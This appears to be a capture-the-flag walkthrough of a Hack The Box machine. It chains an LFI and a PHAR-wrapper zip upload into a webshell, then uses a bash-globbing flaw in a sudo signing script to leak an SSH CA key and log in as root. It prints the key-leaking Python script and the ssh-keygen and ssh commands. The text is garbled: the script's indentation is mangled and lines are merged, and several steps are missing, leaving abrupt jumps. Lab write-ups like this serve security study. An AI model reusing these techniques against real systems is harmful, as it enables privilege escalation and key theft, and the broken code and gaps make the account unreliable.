<p>Performing nmap scan using a quick verbose scan to save time.</p>

<p>Visiting the page, we can see a domain being shown as 'itrc.ssg.htb'. Adding it to our /etc/hosts file.</p>
<p>The domain may hint at multiple subdomains or Vhosts, so we perform fuzzing to discover them.</p>
<img src="/img/Ressource_screenshot/Pasted image 20240819183930.png" alt="Page parameter">

<p>Trying multiple wordlists, we find a new Vhost with the 'n0kovo_subdomains.txt' wordlist, 'signserv.ssg.htb', which we add to the hosts configuration file.</p>

<p>Visiting the port 80 webpage, we are welcomed by an IT support center.</p>

<p>Following standard methodology, we check the source code but find nothing useful. We run a long gobuster scan in the background.</p>

<p>Upon logging in, we get a nice dashboard.</p>

<p> The file name was changed to '7897482fb56032dbe80010ff567893e372e751d9.zip' which seems to be a hash. After analysis and using hash identification tools, sha1 was identified.</p>
<p> Seems that the application hash the file in sha1 format and upload it with this name.</p>

<p>Zip files techniques like empty zip file, zip slip, malicious code injection in the zip files, simlink and others can be tried.</p>
<p>Uploading an empty zip files did reveal some information.</p>

<p>First, the root directory of the webserver was exposed 'var/www/itrc/'</p>
<p>second, we get the method ' ZipArchive' that the server use. This method has a vulnerability where it can lead to RCE , this <a href="https://snyk.io/blog/suitecrm-phar-deserialization-vulnerability-to-code-execution/" target="_blank">article</a> explains it.</p>
<p>Rebuilding what we discovered, found the root path of the web application found a potential attack vector through a PHAR attack. What is needed for the complete attack vector to work is a vulnerable LFI parameter.</p>
<p>We test the 'page' parameter found earlier with the findings from gobuster. 'admin.php' doesn't work, but removing the extension reveals a new page.</p>
<img src="/img/Ressource_screenshot/Pasted image 20240819192857.png" alt="LFI discovery">

<p>Testing the full path discovered: 'http://itrc.ssg.htb/?page=/var/www/itrc/admin' LFI is confirmed.</p>

<p>What is needed now is to make a php web shell file, put it in a zip file, upload it and read it using the 'phar://' wrapper.</p>
<img src="/img/Ressource_screenshot/Pasted image 20240819194232.png" alt="Zip file creation">
<p>Last step was not necessary but it was done to get the specific name of the zip file that we will be accessing (although it could be done from the browser directly)</p>

Reading this <a href="https://dmuth.medium.com/ssh-at-scale-cas-and-principals-b27edca3a5d" target="_blank">article</a> to understand how it works, we can try to make an SSH key pair and sign it by this CA specifying the user to whom it will be valid (here zzinter and maybe try root)</p>
<p>First we need to make an ssh key pair</p>

<p>then we need to sign it and specify root</p>

<p>This script, with the help of external resources, can be explained as follows:</p>
<ol>
  <li>The script requires three arguments: <code>publicKeyFile</code>, <code>username</code>, and <code>principal</code>.</li>
  <li>Sends a CURL request to <code>signserv.ssg.htb</code> to sign the public key.</li>
</ol>
<p>What we need now is to make an ssh key pair and sign it the same way we did last time but instead of doing it manually we will use the script</p>

<p>To exploit this script I got help from a very good friend where he explained a vulnerability in bash
as he mentioned:  </p>
<blockquote>
  <p><strong>axu:</strong> As we know, BASH script tends to be vulnerable when it acts as a role of designed program. Because it is a very "soft" language that we can use various substitutions for certain codes. For example, the wildcard <code>*</code> represents a placeholder for arbitrary characters. And this script suffers from the Bash Globbing Vulnerability. It intends to stop us using the <code>cat-it</code> key, by comparing our provided CA and the original one inside <code>/etc/ssh</code> directory. Therefore, we can leak the original key by trying base64 characters (format for an RSA key) one by one adding wildcard <code>*</code> at the end, identified by the error messages.</p>
</blockquote>

<p>Using his script to help us leak the ca-it key</p>
<pre style="background-color: black; color: white;"><code>
 
import subprocess
# SSH key elements 
header = "-----BEGIN OPENSSH PRIVATE KEY-----" 
footer = "-----END OPENSSH PRIVATE KEY-----" 
ba64chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=" key = [] 
line= 0 
# Iterates over each character to test if it's the next correct one 
while True: 
	for char in ba64chars: 
	# Constructs a test key with * 
	testKey = f"{header}\n{''.join(key)}{char}*" 
	with open("ca-test", "w") as f: 
		f.write(testKey) 
	proc = subprocess.run( 
	["sudo", "/opt/sign_key.sh", "ca-test", "xpl.pub", "root", "root_user", "1"],
	capture_output=True 
	) 
	# If matched, Error code 1 
	if proc.returncode == 1: 
	key.append(char) 
	# Adds a newline every 70 characters 
		if len(key) > 1 and (len(key) - line) % 70 == 0: 
			key.append("\n") 
			line += 1 
		break 
	else: 
		break 
# Constructs the final SSH key from the discovered characters 
caKey = f"{header}\n{''.join(key)}\n{footer}" 
print("The final leaked ca-it is: ", caKey) 
with open("ca-it", "w") as f: 
	f.write(caKey)

</code></pre>

<p>So before running this amazing script, we need to make a ssh key pair</p>
<p>After running the script, we get the valid 'ca-it 'file leaked</p>
<img src="/img/Ressource_screenshot/Pasted image 20240820003141.png" alt="cat it leaked">
	
<p>Now signing a new key pair with the freshly leaked certificate</p>
<pre style="background-color: black; color: white;"><code>
ssh-keygen -s ca-it -z 1234 -I root -V -100w:forever -n root_user rootKey.pub
</code></pre>
<p>And finally we can ssh to root with the following command</p>
<pre style="background-color: black; color: white;"><code>
ssh -o CertificateFile=rootKey-cert.pub -i rootKey root@localhost -p 2222
</code></pre>
